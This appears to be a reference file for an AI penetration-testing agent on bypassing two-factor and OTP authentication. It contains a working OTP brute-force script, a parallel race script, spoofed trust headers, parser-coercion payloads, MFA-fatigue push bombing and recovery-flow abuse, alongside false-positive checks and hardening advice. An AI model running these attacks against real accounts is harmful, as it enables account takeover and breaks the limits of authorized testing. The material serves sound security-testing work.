---
name: 2FA OTP Bypass
description: Reference for two-factor / OTP bypass covering rate-limit gaps, response manipulation, race-on-validation, session-state downgrades, backup-code abuse, recovery-flow chains, and SMS / email / TOTP / push specifics.
---

# 2FA / OTP Bypass

Reference for testing two-factor authentication (TOTP, SMS / email codes, push notifications, backup codes, WebAuthn / FIDO). Pull this in when you have a credential-only first factor working and the target asks for a second factor before issuing a session.

> Black-box scope: probes drive HTTP and observe response-body / status / cookie state across the second-factor verification flow. Many findings live in the gap between the first-factor cookie and the fully-authenticated cookie.

## Tool wiring

| Action | Tool | Notes |
|---|---|---|
| Drive the auth flow | `execute_playwright` | Captures multi-step state (CSRF token, intermediate cookie). |
| Replay code-validation requests | `execute_curl` | Once you've captured the request shape from the browser. |
| Brute force OTP codes | `execute_code` | Asyncio + `httpx`; bound by rate-limit observations. |
| TOTP entropy / drift testing | `execute_code` | `pyotp` for generation; verify time skew tolerance. |

## Reconnaissance

### Identify the second-factor type

| Signal | Type |
|---|---|
| `Enter the 6-digit code from your authenticator app` | TOTP (RFC 6238) |
| `We sent a code to ***-***-1234` | SMS |
| `We sent a code to user@example.com` | Email |
| `Approve the sign-in on your device` | Push (Authy, Duo, Okta Verify, MS Authenticator) |
| `Enter your backup code` | Backup codes |
| `Insert your security key` / WebAuthn dialog | FIDO2 / WebAuthn |
| `Enter the code from your card` | Hardware OTP (YubiKey OTP, RSA SecurID) |

### Identify the validation request

After first factor:

```
POST /auth/login              (returns 200 + intermediate cookie)
POST /auth/2fa/verify         (the validation; returns full session on success)
```

Capture the validation request shape: URL, method, body, cookies, headers, response.

### Inventory recovery / fallback flows

Every 2FA gate has fallback paths. Find them all:

```
/auth/2fa/verify              <- primary
/auth/2fa/sms                 <- alternative method
/auth/2fa/email
/auth/2fa/backup-code
/auth/2fa/recover             <- "I lost my device"
/auth/2fa/disable
/auth/totp/setup              <- if enrollment flow is reachable
/auth/webauthn/options
/auth/webauthn/finish
```

The fallback flow is usually the bypass.

## Captured-traffic workflow (proxy_brain tools)

If HTTP Traffic Capture is enabled, source and drive the second-factor probes from the recorded login flow instead of rebuilding the validation request by hand. proxy_brain tools only see traffic that went through the capture proxy, so drive the first factor + 2FA prompt through it first, then work from the captured `/auth/2fa/verify` transaction.

- OTP brute force (attack 1) is redamon.fuzz when the code rides a query parameter: `redamon.fuzz(<verify_txn>, "code", ["000000","000001","000002"])` returns per-payload status+length, so a valid code stands out by a differing body length or a 200. redamon.fuzz caps at 50 payloads and only walks a query param, so for the full space or a JSON / form body position, iterate `redamon.replay(<verify_txn>, {"body":"{\"code\":\"NNNNNN\"}"})` in a loop.
- Code reuse / replay (attack 3): `redamon.replay(<successful_verify_txn>, {})` re-submits the same code after logout to test single-use enforcement.
- Session-state downgrade (attack 6): `redamon.replay(<sensitive_txn>, {"dropHeaders":["Cookie"],"cookie":"sid_partial=<intermediate>"})` hits a sensitive endpoint with only the intermediate cookie.
- Header-trust bypass (attack 14): `redamon.replay(<sensitive_txn>, {"headers":{"X-2FA-Verified":"true"}})`, then `{"headers":{"X-Skip-2FA":"1"}}`.
- Parser-differential (attack 15): `redamon.replay(<verify_txn>, {"headers":{"Content-Type":"application/x-www-form-urlencoded"},"body":"code[]=1&code[]=2"})` and JSON coercion bodies (`{"code":null}`, `{"code":0}`, `{"code":[]}`).
- `redamon.diff(<valid_code_txn>, <invalid_code_txn>)` reveals exactly what the server checks (the response diff between a valid and an invalid code); `redamon.to_curl(id)` renders the winning request for the report.

Caveat: redamon.fuzz iterates one query parameter only and is capped at 50 payloads, so large brute-force runs still belong in execute_code; redamon.replay pins host/scheme/port to the origin. Race-on-validation (attack 11) still needs execute_code for true parallelism.

## Attack matrix

### 1. Missing rate limit on code validation

The most common 2FA bug. Code is 4-8 digits = 10000 to 100M space. Without rate limiting, brute-force is feasible.

```
execute_code language: python
import asyncio, httpx
TARGET = "https://target.tld/auth/2fa/verify"
INTERMEDIATE_COOKIE = {"sid_partial":"<from_first_factor>"}
async def fire(code):
    async with httpx.AsyncClient() as c:
        r = await c.post(TARGET, json={"code":code}, cookies=INTERMEDIATE_COOKIE)
        return code, r.status_code, len(r.text)
async def go():
    tasks = [fire(f"{n:06d}") for n in range(1000)]   # try 0-999
    for code, sc, ln in await asyncio.gather(*tasks):
        if sc == 200 or "success" in str(ln):
            print("HIT", code)
            return
asyncio.run(go())
```

If responses don't include 429 / lockout, scale up. With operator approval, full 6-digit space is ~10 minutes at moderate concurrency.

### 2. Per-IP rate limit but per-account miss

Server limits 5 attempts per IP per 5 minutes -- shared across all accounts. Multiple attackers / multiple IPs each get 5 tries.

If per-account limit is missing, an attacker with a botnet bypasses single-IP throttling.

### 3. Code reuse / replay

```
1. Submit valid code -> session granted.
2. Log out.
3. Submit the SAME code -> still accepted?
```

Codes should be single-use. TOTP codes are time-bound (typically 30s) but if the server doesn't track "consumed" within the window, the same code works multiple times.

### 4. Time skew abuse

TOTP servers commonly accept codes from `T-1`, `T`, and `T+1` windows (90 seconds total) for clock drift. Attacker captures a code via phishing / SMS interception and has the entire 90-second window.

```
execute_code language: python
import pyotp, time
shared_secret = "BASE32SECRET"
otp = pyotp.TOTP(shared_secret)
print(otp.at(time.time()))           # current
print(otp.at(time.time() - 30))      # previous window
print(otp.at(time.time() + 30))      # next window
```

Some servers tolerate larger skew (T-2 to T+2 = 150 seconds, or worse).

### 5. Response manipulation

Server returns:

```
{"success": false, "error": "Invalid code"}
```

Modify mid-flight (via Burp / mitmproxy) to:

```
{"success": true}
```

If the client (mobile app, SPA) trusts the response and proceeds to a "success" page that the server treats as authenticated, you've bypassed.

In modern apps the SECOND request (e.g. `GET /api/me`) requires a server-side session token, so this rarely works -- but legacy apps and some mobile flows still rely on client-side decisions.

### 6. Session-state downgrade

```
1. Login as user with 2FA enabled.
2. Server issues an INTERMEDIATE cookie (e.g. sid_partial=...) with reduced privilege.
3. Browser is supposed to call /auth/2fa/verify, then receive the FULL cookie.
```

Bugs:

- The intermediate cookie alone grants full access to some endpoints.
- The intermediate cookie is named identically to the full cookie (so no privilege boundary in code).
- The intermediate cookie is upgraded simply by hitting `/auth/me` without verifying 2FA.

```
execute_curl url: "https://target.tld/api/me" headers: "Cookie: $INTERMEDIATE_COOKIE"
execute_curl url: "https://target.tld/api/sensitive" headers: "Cookie: $INTERMEDIATE_COOKIE"
```

If sensitive operations succeed with only the intermediate cookie, downgrade is live.

### 7. 2FA enable / disable without re-auth

```
POST /auth/2fa/disable        with only the session cookie (no password / TOTP)
```

If a user's session cookie is enough to disable 2FA, an attacker with stolen cookies (XSS, session-fixation, leaked log) can permanently weaken the account.

### 8. Recovery-flow abuse

```
POST /auth/2fa/recover     with email + last-4-of-SSN  -> issues recovery email
```

Probes:

- Can attacker submit attacker-controlled recovery email?
- Does the recovery flow simply skip 2FA without validating ownership?
- Are backup codes exposed via the recovery flow?
- Does email reset poisoning chain into 2FA reset (`/skill host_header_injection`)?

### 9. Backup code weaknesses

```
GET /auth/backup-codes            (showing existing codes if compromised)
POST /auth/backup-codes/regenerate (without re-auth)
```

Backup codes:

- Are they displayed only once at generation? Or accessible later?
- Are they single-use? (Server should mark consumed.)
- Are they rate-limited like TOTP codes? (Often not.)
- Is the entropy adequate? (8-character alphanumeric is ~47 bits; 4-character all-digits is brutally weak.)

### 10. SMS / email-channel attacks

| Vector | Probe |
|---|---|
| SMS swap (port the victim's number to attacker carrier) | Out-of-band; flag as a known threat in reporting |
| SMS code interception via SIM-swap / SS7 | Out-of-band |
| Email reset poisoning (delivers code to attacker domain) | `/skill host_header_injection` |
| Email-server compromise -> code interception | Out-of-band |
| OTP delivered via the SAME channel the password reset uses | Single channel = no factor separation |

### 11. Race condition on validation

```
1. Submit one valid code, parallel x N requests.
2. Server marks code consumed AFTER the validation handler completes.
3. The window between "is_valid?" and "mark_consumed" allows multiple successful logins.
```

```
execute_code language: python
import asyncio, httpx
async def fire(c, code):
    return await c.post("https://target.tld/auth/2fa/verify", json={"code":code})
async def go():
    async with httpx.AsyncClient(http2=True) as c:
        responses = await asyncio.gather(*(fire(c, "123456") for _ in range(20)))
        for r in responses:
            print(r.status_code, r.cookies.get("session", "(none)"))
asyncio.run(go())
```

If multiple sessions are minted, the consume operation is not atomic. See `/skill race_conditions`.

### 12. Push-notification approval blasting

```
For Authy / Okta Verify / Duo: fire 20+ push notifications in 30 seconds.
Hope the user taps "approve" out of fatigue / habit.
```

This is "MFA fatigue" / "MFA bombing" -- famously used in social-engineering attacks. Server-side mitigation: number-matching, blocking after N failed pushes.

### 13. WebAuthn / FIDO2 fallback to OTP

Apps offering WebAuthn often allow fallback to TOTP / SMS. The fallback may have weaker enforcement than WebAuthn.

```
1. Capture the WebAuthn authentication request.
2. Modify request to include "method=totp" or remove WebAuthn parameters.
3. Server falls back to TOTP brute-force surface.
```

### 14. Header-based 2FA bypass

Some apps test for `X-2FA-Verified: true` (set by an internal service); if leaked / spoofable from the edge:

```
execute_curl url: "https://target.tld/api/sensitive" headers: "Cookie: $INTERMEDIATE\nX-2FA-Verified: true"
execute_curl url: "https://target.tld/api/sensitive" headers: "Cookie: $INTERMEDIATE\nX-Skip-2FA: 1"
execute_curl url: "https://target.tld/api/sensitive" headers: "Cookie: $INTERMEDIATE\nX-Internal: yes"
```

Pivot to `/skill host_header_injection` for the broader header-trust matrix.

### 15. JSON / form parser-differential bypass

Some apps validate `code` strictly when the request is JSON but lazily when form-encoded:

```
POST /auth/2fa/verify     Content-Type: application/x-www-form-urlencoded
body: code[]=1&code[]=2&code[]=3   (array vs scalar)

POST /auth/2fa/verify     Content-Type: application/json
body: {"code": null}
body: {"code": 0}
body: {"code": ""}
body: {"code": []}
body: {"code": true}
```

Coercion bugs (`null == "000000"` truthiness) sometimes bypass the check.

## Validation shape

A clean 2FA bypass finding includes:

1. The first-factor login request and intermediate cookie.
2. The bypass technique (named explicitly: brute-force / replay / response-manipulation / downgrade / recovery / race / header-trust).
3. The exact validation request that succeeded without a valid code.
4. The full-session cookie issued post-bypass.
5. A privileged action confirming the session is fully authenticated (`/auth/me` returning the user, `/admin/...` if admin).

## False positives

- Brute force "succeeds" but you stumbled on the real code (verify by repeating with attacker-known wrong codes; should NOT all succeed).
- Per-account rate limit kicks in at 5-10 attempts; brute force halts.
- The "downgrade" finding actually requires the full cookie when revisited.
- Response manipulation works in DevTools but the next server-side request fails because no real session was minted.
- Recovery flow requires email confirmation that is properly bound to the account owner.

## Hardening summary

- Rate-limit code validation per account (not per IP). 5 attempts per code, 5 codes per hour.
- Mark TOTP codes consumed within the entire skew window; no replay.
- Cap skew tolerance at T-1 / T+1 (90 seconds total).
- Use a separate, short-lived intermediate cookie that grants ONLY access to the 2FA-verify endpoint -- no other operation.
- Require re-authentication (password OR existing 2FA) to enable / disable / regenerate 2FA, view backup codes, or reset recovery contact.
- Backup codes: 8-char base32 minimum, single-use, rate-limited.
- For push: number-matching, fatigue prevention (lock after 3 unanswered pushes).
- WebAuthn first; TOTP / SMS only as fallback for legacy clients.
- Bind the second-factor cookie to the device fingerprint (or DPoP / mTLS).
- Audit-log every successful 2FA verification AND every failure.

## Hand-off

```
Brute force success                    -> built-in brute_force_credential_guess (downstream pivots)
Race on validation                      -> /skill race_conditions
Header-trust bypass                     -> /skill host_header_injection
Recovery flow chain via host header     -> /skill host_header_injection + ATO
Recovery via email reset poisoning      -> /skill open_redirect (multi-hop)
Session downgrade                       -> chain to /skill information_disclosure (cookie analysis) + /skill jwt_attacks if JWT
MFA fatigue                             -> social-engineering attack class; flag for operator review
```

## Pro tips

- The validation endpoint's response body is the most informative artifact. Capture it for both valid and invalid codes; the diff reveals what the server checks.
- Many 2FA bypasses are race-condition variants; always test parallel submissions with the same code.
- Recovery flows are the soft underbelly of every 2FA implementation. Spend disproportionate time there.
- "MFA fatigue" is a real attack class -- not a code bug, but a UX bug. Note in reporting if push notifications can be sent at unbounded rate.
- TOTP secrets are sometimes leaked in QR codes embedded in HTML pages; if the enrollment URL is reachable post-enrollment without re-auth, the secret can be re-extracted.
- WebAuthn-only deployments (no fallback) are the gold standard. Any TOTP / SMS fallback widens the attack surface significantly.
